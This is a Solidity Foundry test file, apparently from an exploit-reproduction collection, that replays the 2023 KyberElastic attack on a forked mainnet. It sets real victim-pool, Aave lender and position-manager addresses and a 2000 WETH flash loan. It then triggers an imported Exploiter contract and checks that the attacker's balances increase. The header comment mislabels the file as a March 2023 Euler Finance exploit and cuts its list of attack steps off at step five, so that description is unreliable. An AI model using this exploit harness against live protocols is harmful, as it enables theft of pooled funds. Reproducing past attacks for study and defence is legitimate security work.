//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Exploiter} from "../../src/kyberElastic2023/KyberElastic.sol";
import {ForkUtils} from "../utils/ForkUtils.t.sol";

/**
 * @notice Euler Finance Exploit Test - March 2023
 * @dev Attack Steps:
 *      1. Flash loan 2000 WETH from Aave
 *      2. Move the tick Range to ticks with zero liquidity
 *      3. Add liquidity to the pool
 *      4. Remove some liquidity from the pool
 *      5
 */

contract KyberElastic2023Exploit is Test, ForkUtils {
    //contract addresses for exploit pool frxETH <=> WETH 
    address public victimPool = 0xFd7B111AA83b9b6F547E617C7601EfD997F64703;
    address public lender = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    uint256 public flashloanAmount = 0x6c6b935b8bbd400000;//2000e18
    address public positionManager = 0xe222fBE074A436145b255442D919E4E3A6c6a480;
    Exploiter public exploiter;

    //chain details
    string public constant ATTACK_ID = "kyberElastic2023";
    uint256 constant ATTACK_BLOCK_NUMBER = 18_630_391; //one block before the attack happened

    function setUp() public {
        //setup fork
        string memory rpcUrl = vm.envString("MAINNET_RPC_URL");
        setupFork(ATTACK_ID, rpcUrl, ATTACK_BLOCK_NUMBER -1);
        selectFork(ATTACK_ID);

        //deploy exploiter
        exploiter = new Exploiter(victimPool, lender, flashloanAmount, positionManager);
    }

    function testKyberElastic2023Exploit() public {
        uint256 token0BalanceBefore = exploiter.token0().balanceOf(address(exploiter));
        uint256 token1BalanceBefore = exploiter.token1().balanceOf(address(exploiter));
        console.log("token0BalanceBefore: %s", token0BalanceBefore);
        console.log("token1BalanceBefore: %s", token1BalanceBefore);

        exploiter.trigger();

        uint256 token0BalanceAfter = exploiter.token0().balanceOf(address(exploiter));
        uint256 token1BalanceAfter = exploiter.token1().balanceOf(address(exploiter));
        console.log("token0BalanceAfter: %s", token0BalanceAfter);
        console.log("token1BalanceAfter: %s", token1BalanceAfter);
        assertGt(token0BalanceAfter, token0BalanceBefore, "token0Balance should increase");
        assertGt(token1BalanceAfter, token1BalanceBefore, "token1Balance should increase");

    }
  
}